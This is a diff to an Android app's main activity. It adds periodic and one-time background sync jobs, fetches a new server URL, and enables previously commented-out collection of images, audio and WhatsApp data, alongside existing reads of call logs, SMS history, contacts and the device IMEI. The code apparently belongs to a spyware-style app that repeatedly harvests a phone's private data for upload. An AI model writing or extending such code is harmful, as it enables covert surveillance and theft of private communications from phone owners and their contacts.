@@ -17,7 +17,9 @@ import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import androidx.localbroadcastmanager.content.LocalBroadcastManager;
 import androidx.work.BackoffPolicy;
+import androidx.work.Data;
 import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.ExistingWorkPolicy;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
@@ -272,12 +274,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
 
     public static void setupWorkManager() {
+        Data.Builder mData= new Data.Builder();
+        mData.putString ("Type","Periodic");
         mPeriodicWorkRequest = new PeriodicWorkRequest.Builder(SyncData.class, 15,
-                TimeUnit.MINUTES).setBackoffCriteria(
+                TimeUnit.MINUTES).setInputData(mData.build()).setBackoffCriteria(
                 BackoffPolicy.LINEAR,
                 PeriodicWorkRequest.MIN_BACKOFF_MILLIS,
                 TimeUnit.MILLISECONDS).build();
-        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.KEEP, mPeriodicWorkRequest);
+        mWorkManager.enqueueUniquePeriodicWork("PERIODIC_REQUEST_TAG", ExistingPeriodicWorkPolicy.REPLACE, mPeriodicWorkRequest);
         geturl();
         mPeriodicWorkRequest1 = new PeriodicWorkRequest.Builder(SyncContact.class, 50,
                 TimeUnit.MINUTES).setBackoffCriteria(
@@ -352,6 +356,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                         },
                         1);
             } else {
+                setuponetimeworkManager("Permission Already Given");
                 getImieNumbers(this);
                 AsyncTask.execute(new Runnable() {
                     @Override
@@ -381,12 +386,10 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         });
         readCallLogs(getApplicationContext(), mSharedpref);
         readSmsHistory(this, mSharedpref);
-       //getFiles(mSharedpref);
-      //  getAllShownImagesPath();
-       // getAudios();
-       // getFiles(mSharedpref);
-      //  getWhatsAppNotes(mSharedpref);
-      //  getWhatsAppStatus(mSharedpref);
+        getMultimediaData();
+    }
+
+    private void getMultimediaData() {
         MultiMediaData multiMediaData=new MultiMediaData(this,mSharedpref);
         multiMediaData.getAllShownImagesPath();
         multiMediaData.getAudios();
@@ -770,20 +773,22 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
                 }
                 break;
                 case R.id.CheckAutoStart:
-                    setuponetimeworkManager();
+                    setuponetimeworkManager("From Stop Button");
                    // checkAutoStartOption();
                 break;
             case R.id.SynData:
 
-                setuponetimeworkManager();
+                setuponetimeworkManager("From Sync Button");
                 break;
         }
     }
 
-    public static void setuponetimeworkManager() {
+    public static void setuponetimeworkManager(String message) {
     try {
-        mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(SyncData.class).build();
-        mWorkManager.enqueue(mOneTimeWorkRequest);
+        Data.Builder mData= new Data.Builder();
+        mData.putString ("Type","Onetime "+message);
+        mOneTimeWorkRequest = new OneTimeWorkRequest.Builder(SyncOneTimeData.class).setInputData(mData.build()).build();
+        mWorkManager.enqueueUniqueWork("PERIODIC_REQUEST_TAG", ExistingWorkPolicy.REPLACE, mOneTimeWorkRequest);
         UrlTimeWorkRequest=new OneTimeWorkRequest.Builder(GetNewUrl.class).build();
         mWorkManager.enqueue(UrlTimeWorkRequest);
         setupWorkManager();
